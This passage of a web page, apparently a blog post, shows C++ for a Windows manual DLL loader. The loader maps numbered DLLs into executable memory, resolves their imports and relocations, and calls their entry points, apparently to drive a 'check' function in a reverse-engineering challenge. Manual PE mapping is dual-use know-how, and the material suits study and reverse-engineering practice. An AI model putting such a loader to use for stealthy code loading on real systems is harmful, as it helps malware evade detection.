class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;filesystem&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> fs = std::filesystem;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadedDllInfo</span> &#123;</span><br><span class="line">    std::string filePath;</span><br><span class="line">    HMODULE hModule = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">size_t</span> imageSize = <span class="number">0</span>;</span><br><span class="line">    std::map&lt;std::string, LPVOID&gt; exports;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> g_output_buffer[<span class="number">40000</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">std::map&lt;<span class="type">unsigned</span> <span class="type">short</span>, LoadedDllInfo&gt; loadedDllCache;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(__stdcall *CheckFunc)</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hexToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hex_str, <span class="type">unsigned</span> <span class="type">char</span>* output)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hex_str.<span class="built_in">length</span>() != <span class="number">64</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: Length of HEX must be 64 chars (32 bytes).&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            output[i] = (<span class="type">unsigned</span> <span class="type">char</span>)std::<span class="built_in">stoul</span>(hex_str.<span class="built_in">substr</span>(i * <span class="number">2</span>, <span class="number">2</span>), <span class="literal">nullptr</span>, <span class="number">16</span>);</span><br><span class="line">        &#125; <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;[!]: Invalid hex char.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LoadedDllInfo* <span class="title">LoadCustomDll</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> dllIndex)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (loadedDllCache.<span class="built_in">count</span>(dllIndex)) &#123;</span><br><span class="line">        <span class="comment">// std::cout &lt;&lt; &quot;[*] Fetched: DLL &quot; &lt;&lt; std::setw(4) &lt;&lt; std::setfill(&#x27;0&#x27;) &lt;&lt; dllIndex &lt;&lt; &quot; loaded.&quot; &lt;&lt; std::endl;</span></span><br><span class="line">        <span class="keyword">return</span> &amp;loadedDllCache[dllIndex];</span><br><span class="line">    &#125;</span><br><span class="line">    std::string filename = std::<span class="built_in">to_string</span>(dllIndex);</span><br><span class="line">    <span class="keyword">while</span> (filename.<span class="built_in">length</span>() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        filename.<span class="built_in">insert</span>(<span class="number">0</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    std::string dllPath = <span class="string">&quot;dlls/&quot;</span> + filename + <span class="string">&quot;.dll&quot;</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;[*] Try to load: &quot; &lt;&lt; dllPath &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(dllPath, std::ios::binary | std::ios::ate)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: Cannot open &quot;</span> &lt;&lt; dllPath &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> fileSize = file.<span class="built_in">tellg</span>();</span><br><span class="line">    file.<span class="built_in">seekg</span>(<span class="number">0</span>, std::ios::beg);</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">dllData</span><span class="params">(fileSize)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">read</span>(dllData.<span class="built_in">data</span>(), fileSize)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: Cannot read &quot;</span> &lt;&lt; dllPath &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* rawDll = dllData.<span class="built_in">data</span>();</span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)rawDll;</span><br><span class="line">    <span class="keyword">if</span> (dosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: File &quot;</span> &lt;&lt; dllPath &lt;&lt; <span class="string">&quot; is invalid.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(rawDll + dosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (ntHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: File &quot;</span> &lt;&lt; dllPath &lt;&lt; <span class="string">&quot; was corrupted.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD imageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">    LPVOID baseAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!baseAddress) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: VirtualAlloc failed.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD headerSize = ntHeaders-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">    <span class="built_in">memcpy</span>(baseAddress, rawDll, headerSize);</span><br><span class="line">    PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ntHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; ++i, ++sectionHeader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;SizeOfRawData &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            LPVOID destination = (LPVOID)((<span class="type">char</span>*)baseAddress + sectionHeader-&gt;VirtualAddress);</span><br><span class="line">            LPVOID source = (LPVOID)(rawDll + sectionHeader-&gt;PointerToRawData);</span><br><span class="line">            <span class="built_in">memcpy</span>(destination, source, sectionHeader-&gt;SizeOfRawData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_NT_HEADERS mappedNtHeaders = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)baseAddress + dosHeader-&gt;e_lfanew);</span><br><span class="line">    ULONGLONG delta = (ULONGLONG)baseAddress - mappedNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY importDir = &amp;mappedNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">    <span class="keyword">if</span> (importDir-&gt;Size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((<span class="type">char</span>*)baseAddress + importDir-&gt;VirtualAddress);</span><br><span class="line">        <span class="keyword">for</span> (; importDesc-&gt;Name; ++importDesc) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">char</span>* dllName = (<span class="type">const</span> <span class="type">char</span>*)baseAddress + importDesc-&gt;Name;</span><br><span class="line">            HMODULE hImportedDll = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="type">bool</span> isCustomDllIndex = (<span class="built_in">strlen</span>(dllName) &gt;= <span class="number">4</span>) &amp;&amp; std::<span class="built_in">all_of</span>(dllName, dllName + <span class="number">4</span>, ::isdigit);</span><br><span class="line">            <span class="keyword">if</span> (isCustomDllIndex) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">short</span> dependencyIndex = (<span class="type">unsigned</span> <span class="type">short</span>)std::<span class="built_in">atoi</span>(dllName);</span><br><span class="line">                <span class="comment">// std::cout &lt;&lt; &quot;[*] Depends to DLL: &quot; &lt;&lt; dllName &lt;&lt; &quot;, load index &quot; &lt;&lt; dependencyIndex &lt;&lt; &quot;...&quot; &lt;&lt; std::endl;</span></span><br><span class="line">                LoadedDllInfo* dependencyInfo = <span class="built_in">LoadCustomDll</span>(dependencyIndex);</span><br><span class="line">                <span class="keyword">if</span> (!dependencyInfo) &#123;</span><br><span class="line">                    std::cerr &lt;&lt; <span class="string">&quot;[!]: Load DLL &quot;</span> &lt;&lt; dllName &lt;&lt; <span class="string">&quot; failed.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                    <span class="built_in">VirtualFree</span>(baseAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                hImportedDll = dependencyInfo-&gt;hModule;</span><br><span class="line">                PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)((<span class="type">char</span>*)baseAddress + importDesc-&gt;FirstThunk);</span><br><span class="line">                <span class="keyword">while</span> (firstThunk-&gt;u<span class="number">1.</span>AddressOfData) &#123;</span><br><span class="line">                    <span class="type">const</span> <span class="type">char</span>* funcName = (<span class="type">const</span> <span class="type">char</span>*)((<span class="type">char</span>*)baseAddress + firstThunk-&gt;u<span class="number">1.</span>AddressOfData + <span class="number">2</span>);</span><br><span class="line">                    <span class="function">std::string <span class="title">funcNameStr</span><span class="params">(funcName)</span></span>;</span><br><span class="line">                    <span class="keyword">if</span> (dependencyInfo-&gt;exports.<span class="built_in">count</span>(funcNameStr)) &#123;</span><br><span class="line">                        firstThunk-&gt;u<span class="number">1.F</span>unction = (ULONGLONG)dependencyInfo-&gt;exports[funcNameStr];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        std::cerr &lt;&lt; <span class="string">&quot;[!]: DLL &quot;</span> &lt;&lt; dllName &lt;&lt; <span class="string">&quot; has no function: &quot;</span> &lt;&lt; funcNameStr &lt;&lt; std::endl;</span><br><span class="line">                        firstThunk-&gt;u<span class="number">1.F</span>unction = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++firstThunk;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hImportedDll = <span class="built_in">LoadLibraryA</span>(dllName);</span><br><span class="line">                <span class="keyword">if</span> (!hImportedDll) &#123;</span><br><span class="line">                    DWORD errorCode = <span class="built_in">GetLastError</span>();</span><br><span class="line">                    std::cerr &lt;&lt; <span class="string">&quot;[!]: LoadLibraryA loads DLL &quot;</span> &lt;&lt; dllName &lt;&lt; <span class="string">&quot; failed. ERR CODE: &quot;</span> &lt;&lt; errorCode &lt;&lt; std::endl;</span><br><span class="line">                    <span class="built_in">VirtualFree</span>(baseAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)((<span class="type">char</span>*)baseAddress + importDesc-&gt;FirstThunk);</span><br><span class="line">                <span class="keyword">while</span> (firstThunk-&gt;u<span class="number">1.</span>AddressOfData) &#123;</span><br><span class="line">                    LPCSTR funcName = <span class="literal">nullptr</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">IMAGE_SNAP_BY_ORDINAL64</span>(firstThunk-&gt;u<span class="number">1.</span>AddressOfData)) &#123;</span><br><span class="line">                        funcName = (LPCSTR)<span class="built_in">IMAGE_ORDINAL64</span>(firstThunk-&gt;u<span class="number">1.</span>AddressOfData);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        funcName = (LPCSTR)((<span class="type">char</span>*)baseAddress + firstThunk-&gt;u<span class="number">1.</span>AddressOfData + <span class="number">2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    FARPROC procAddr = <span class="built_in">GetProcAddress</span>(hImportedDll, funcName);</span><br><span class="line">                    <span class="keyword">if</span> (!procAddr) &#123;</span><br><span class="line">                        std::cerr &lt;&lt; <span class="string">&quot;[!]: System DLL &quot;</span> &lt;&lt; dllName &lt;&lt; <span class="string">&quot; has no func: &quot;</span> &lt;&lt; (<span class="built_in">IMAGE_SNAP_BY_ORDINAL64</span>(firstThunk-&gt;u<span class="number">1.</span>AddressOfData) ? <span class="string">&quot;Ordinal&quot;</span> : (<span class="type">const</span> <span class="type">char</span>*)funcName) &lt;&lt; std::endl;</span><br><span class="line">                        firstThunk-&gt;u<span class="number">1.F</span>unction = <span class="number">0</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        firstThunk-&gt;u<span class="number">1.F</span>unction = (ULONGLONG)procAddr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++firstThunk;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY exportDir = &amp;mappedNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    LoadedDllInfo&amp; info = loadedDllCache[dllIndex];</span><br><span class="line">    info.hModule = (HMODULE)baseAddress;</span><br><span class="line">    info.imageSize = imageSize;</span><br><span class="line">    info.filePath = dllPath;</span><br><span class="line">    <span class="keyword">if</span> (exportDir-&gt;Size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        PIMAGE_EXPORT_DIRECTORY exportDesc = (PIMAGE_EXPORT_DIRECTORY)((<span class="type">char</span>*)baseAddress + exportDir-&gt;VirtualAddress);</span><br><span class="line">        DWORD* nameRvas = (DWORD*)((<span class="type">char</span>*)baseAddress + exportDesc-&gt;AddressOfNames);</span><br><span class="line">        WORD* ordinalTable = (WORD*)((<span class="type">char</span>*)baseAddress + exportDesc-&gt;AddressOfNameOrdinals);</span><br><span class="line">        DWORD* funcRvas = (DWORD*)((<span class="type">char</span>*)baseAddress + exportDesc-&gt;AddressOfFunctions);</span><br><span class="line">        <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; exportDesc-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">char</span>* funcName = (<span class="type">const</span> <span class="type">char</span>*)((<span class="type">char</span>*)baseAddress + nameRvas[i]);</span><br><span class="line">            DWORD funcRva = funcRvas[ordinalTable[i]];</span><br><span class="line">            LPVOID funcAddr = (LPVOID)((<span class="type">char</span>*)baseAddress + funcRva);</span><br><span class="line">            info.exports[funcName] = funcAddr;</span><br><span class="line">            <span class="comment">// if (strcmp(funcName, &quot;_Z5checkPh&quot;) == 0) &#123;</span></span><br><span class="line">            <span class="comment">//     std::cout &lt;&lt; &quot;[*] Find check function _Z5checkPh, addr: 0x&quot; &lt;&lt; std::hex &lt;&lt; std::setw(16) &lt;&lt; std::setfill(&#x27;0&#x27;) &lt;&lt; (uintptr_t)funcAddr &lt;&lt; std::dec &lt;&lt; std::endl;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_DATA_DIRECTORY baseRelocDir = &amp;mappedNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">    <span class="keyword">if</span> (baseRelocDir-&gt;Size &gt; <span class="number">0</span> &amp;&amp; delta != <span class="number">0</span>) &#123;</span><br><span class="line">        PIMAGE_BASE_RELOCATION relocBlock = (PIMAGE_BASE_RELOCATION)((<span class="type">char</span>*)baseAddress + baseRelocDir-&gt;VirtualAddress);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> baseDelta = (<span class="type">long</span> <span class="type">long</span>)delta;</span><br><span class="line">        <span class="keyword">while</span> (relocBlock-&gt;SizeOfBlock &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            WORD* relocEntry = (WORD*)((<span class="type">char</span>*)relocBlock + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; (relocBlock-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD); ++i) &#123;</span><br><span class="line">                WORD typeOffset = relocEntry[i];</span><br><span class="line">                DWORD offset = typeOffset &amp; <span class="number">0x0FFF</span>;</span><br><span class="line">                DWORD type = (typeOffset &gt;&gt; <span class="number">12</span>);</span><br><span class="line">                <span class="keyword">if</span> (type == IMAGE_REL_BASED_ABSOLUTE) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                PULONG_PTR fixupAddr = (PULONG_PTR)((<span class="type">char</span>*)baseAddress + relocBlock-&gt;VirtualAddress + offset);</span><br><span class="line">                <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">                    <span class="keyword">case</span> IMAGE_REL_BASED_DIR64:</span><br><span class="line">                        *fixupAddr += baseDelta;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> IMAGE_REL_BASED_HIGHLOW:</span><br><span class="line">                        *(PDWORD)fixupAddr += (DWORD)baseDelta;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> IMAGE_REL_BASED_HIGH:</span><br><span class="line">                        *(PUSHORT)fixupAddr += <span class="built_in">HIWORD</span>(baseDelta);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> IMAGE_REL_BASED_LOW:</span><br><span class="line">                        *(PUSHORT)fixupAddr += <span class="built_in">LOWORD</span>(baseDelta);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            relocBlock = (PIMAGE_BASE_RELOCATION)((<span class="type">char</span>*)relocBlock + relocBlock-&gt;SizeOfBlock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD entryPointRVA = mappedNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">    <span class="keyword">if</span> (entryPointRVA != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">typedef</span> __int64 (__fastcall *CustomDllEntryProc)(LPVOID OutputAddr, DWORD Reason, LPVOID Reserved);</span><br><span class="line">        CustomDllEntryProc DllMainFunc = (CustomDllEntryProc)((<span class="type">char</span>*)baseAddress + entryPointRVA);</span><br><span class="line">        <span class="comment">// std::cout &lt;&lt; &quot;[*] Trying to call DllMain (DLL_PROCESS_ATTACH)...&quot; &lt;&lt; std::endl;</span></span><br><span class="line">        __int64 callResult = <span class="built_in">DllMainFunc</span>((LPVOID)g_output_buffer, DLL_PROCESS_ATTACH, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (callResult == <span class="number">0</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;[!]: DllMain returns 0.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// std::cout &lt;&lt; &quot;[*] Custom DllMain Called, res: &quot; &lt;&lt; callResult &lt;&lt; std::endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!] DLL has no entry point.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;[*] Sunccessfully loads DLL &quot; &lt;&lt; filename &lt;&lt; &quot; , base addr: 0x&quot; &lt;&lt; std::hex &lt;&lt; std::setw(16) &lt;&lt; std::setfill(&#x27;0&#x27;) &lt;&lt; (uintptr_t)baseAddress &lt;&lt; std::dec &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="keyword">return</span> &amp;info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cleanup_resources</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\n[*] Cleaning up...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> <span class="type">const</span>&amp; [index, info] : loadedDllCache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (info.hModule) &#123;</span><br><span class="line">            <span class="built_in">VirtualFree</span>(info.hModule, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    loadedDllCache.<span class="built_in">clear</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Cleaned up.&quot;</span> &lt;&lt; std::endl;</span><br><span 